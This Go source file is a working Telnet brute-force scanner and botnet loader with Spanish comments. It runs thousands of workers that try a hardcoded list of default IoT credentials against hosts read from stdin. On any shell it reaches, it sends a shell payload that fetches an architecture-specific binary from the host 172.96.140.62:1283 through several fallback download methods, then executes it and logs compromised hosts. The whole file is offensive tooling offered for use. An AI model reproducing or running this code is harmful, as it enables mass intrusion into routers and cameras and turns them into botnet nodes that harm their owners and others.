package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
	// Más credenciales comunes
	{"root", "12345678"},
	{"root", "12345"},
	{"root", "123456789"},
	{"root", "qwerty"},
	{"root", "passw0rd"},
	{"root", "letmein"},
	{"root", "changeme"},
	{"root", "Zte521"},
	{"root", "hikvision"},
	{"admin", "hikvision"},
	{"root", "dahua"},
	{"admin", "dahua"},
	{"root", "Admin123"},
	{"root", "password123"},
	{"root", "2024"},
	{"root", "2025"},
	{"root", "2026"},
}

const (
	TELNET_TIMEOUT    = 8 * time.Second
	MAX_WORKERS       = 5000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 500000
	CONNECT_TIMEOUT   = 3 * time.Second
)

// PAYLOAD CORREGIDO Y OPTIMIZADO - CON URL COMPLETA
const PAYLOAD = `cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || cd /var || cd /;
a=$(uname -m);
if echo "$a" | grep -q "x86_64"; then b="x86_64/x86_64";
elif echo "$a" | grep -q "i[3-6]86"; then b="x86/x86";
elif echo "$a" | grep -q "armv7"; then b="arm7/arm7";
elif echo "$a" | grep -q "armv6"; then b="arm6/arm6";
elif echo "$a" | grep -q "armv5"; then b="arm5/arm5";
elif echo "$a" | grep -q "aarch64"; then b="aarch64/aarch64";
elif echo "$a" | grep -q "mips"; then 
    if echo "$a" | grep -q "el"; then b="mipsel/mipsel"; else b="mips/mips"; fi
else b="x86_64/x86_64";
fi
url="http://172.96.140.62:1283/bots/$b";
if command -v wget >/dev/null 2>&1; then
    wget -q -O .x "$url" 2>/dev/null || wget -O .x "$url" 2>/dev/null;
elif command -v curl >/dev/null 2>&1; then
    curl -s -o .x "$url" 2>/dev/null || curl -o .x "$url" 2>/dev/null;
elif command -v busybox >/dev/null 2>&1; then
    busybox wget -q -O .x "$url" 2>/dev/null || busybox wget -O .x "$url" 2>/dev/null;
elif command -v fetch >/dev/null 2>&1; then
    fetch -q -o .x "$url" 2>/dev/null || fetch -o .x "$url" 2>/dev/null;
elif command -v tftp >/dev/null 2>&1; then
    tftp -g -r "bots/$(basename $b)" -l .x 172.96.140.62 2>/dev/null;
elif command -v ftp >/dev/null 2>&1; then
    echo "open 172.96.140.62 1283
get bots/$(basename $b) .x
quit" | ftp -n 2>/dev/null;
elif echo >/dev/tcp/172.96.140.62/1283 2>/dev/null; then
    exec 3<>/dev/tcp/172.96.140.62/1283 && echo -e "GET /bots/$b HTTP/1.0\r\nHost: 172.96.140.62\r\n\r\n" >&3 && cat <&3 > .x && exec 3<&- 2>/dev/null;
fi
if [ -f .x ]; then
    chmod +x .x 2>/dev/null;
    ./.x;
    echo "LOADER_SUCCESS";
fi`

// PAYLOAD ALTERNATIVO PARA SISTEMAS MUY VIEJOS
const PAYLOAD_LEGACY = `cd /tmp; cd /var; cd /; cd /var/run; cd /root;
a=\` + "`uname -m`" + `;
if echo $a | grep 86 > /dev/null; then 
 wget http://172.96.140.62:1283/bots/x86/x86 -O x;
elif echo $a | grep arm > /dev/null; then 
 wget http://172.96.140.62:1283/bots/arm7/arm7 -O x;
elif echo $a | grep mips > /dev/null; then 
 wget http://172.96.140.62:1283/bots/mips/mips -O x;
else 
 wget http://172.96.140.62:1283/bots/x86_64/x86_64 -O x;
fi
chmod 777 x;
./x;
echo "LOADER_SUCCESS";`

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Output   string
	Success  bool
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	loaders          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
	loaderFile       *os.File
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	// Abrir archivo para guardar loaders exitosos
	f, err := os.OpenFile("loader.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error abriendo loader.txt: %v\n", err)
		return nil
	}
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
		loaderFile:       f,
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	// Buscar shell prompt
	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	shellFound := false
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			shellFound = true
			break
		}
	}

	if shellFound {
		// Intentar payload principal
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write([]byte(PAYLOAD + "\n"))
		if err != nil {
			return false, "write command failed"
		}
		
		output := s.readCommandOutput(conn)
		
		// Verificar si fue exitoso
		success := strings.Contains(output, "LOADER_SUCCESS")
		
		// Si no funcionó, intentar payload legacy
		if !success {
			conn.Write([]byte(PAYLOAD_LEGACY + "\n"))
			time.Sleep(5 * time.Second)
			output2 := s.readCommandOutput(conn)
			success = strings.Contains(output2, "LOADER_SUCCESS")
			if success {
				output = output2
			}
		}
		
		return true, CredentialResult{
			Host:     host,
			Username: username,
			Password: password,
			Output:   output,
			Success:  success,
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 4096)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := 8 * time.Second

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			break
		}
		if n > 0 {
			data = append(data, buf[:n]...)
			if bytes.Contains(data, []byte("LOADER_SUCCESS")) {
				break
			}
		}
	}
	
	return string(data)
}

func (s *TelnetScanner) saveLoader(host, username, password string) {
	s.lock.Lock()
	defer s.lock.Unlock()
	
	line := fmt.Sprintf("%s:%s:%s\n", host, username, password)
	s.loaderFile.WriteString(line)
	s.loaderFile.Sync()
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				if credResult.Success {
					atomic.AddInt64(&s.loaders, 1)
					s.saveLoader(credResult.Host, credResult.Username, credResult.Password)
					fmt.Printf("\n🔥 LOADER: %s | %s:%s\n", 
						credResult.Host, credResult.Username, credResult.Password)
				} else {
					fmt.Printf("\n[+] Found: %s | %s:%s\n", 
						credResult.Host, credResult.Username, credResult.Password)
				}
				
				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			loaders := atomic.LoadInt64(&s.loaders)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 Escaneados: %d | ✅ Logins: %d | ❌ Fallos: %d | 🔥 Loaders: %d | Cola: %d | 🧵 %d", 
				scanned, valid, invalid, loaders, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	defer s.loaderFile.Close()
	
	fmt.Println("\n\n╔════════════════════════════════════════╗")
	fmt.Println("║     SHIFT/RIVEN TELNET SCANNER         ║")
	fmt.Println("║     PAYLOAD CORREGIDO - 2026           ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Printf("CPU Cores: %d\n", runtime.NumCPU())
	fmt.Printf("Workers: %d\n", MAX_WORKERS)
	fmt.Printf("Servidor: 172.96.140.62:1283\n")
	fmt.Printf("Arquitecturas: x86, x86_64, arm5, arm6, arm7, aarch64, mips, mipsel\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" {
				// Validar IP
				if net.ParseIP(host) != nil {
					atomic.AddInt64(&s.queueSize, 1)
					hostCount++
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("\n📥 Hosts cargados: %d\n", hostCount)
		stdinDone <- true
	}()

	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	loaders := atomic.LoadInt64(&s.loaders)
	
	fmt.Println("\n\n✅ SCAN COMPLETADO")
	fmt.Printf("📊 Total escaneados: %d\n", scanned)
	fmt.Printf("✅ Logins válidos: %d\n", valid)
	fmt.Printf("🔥 Loaders exitosos: %d\n", loaders)
	fmt.Printf("📁 Loaders guardados en loader.txt\n")
}

func main() {
	scanner := NewTelnetScanner()
	if scanner != nil {
		scanner.Run()
	}
}
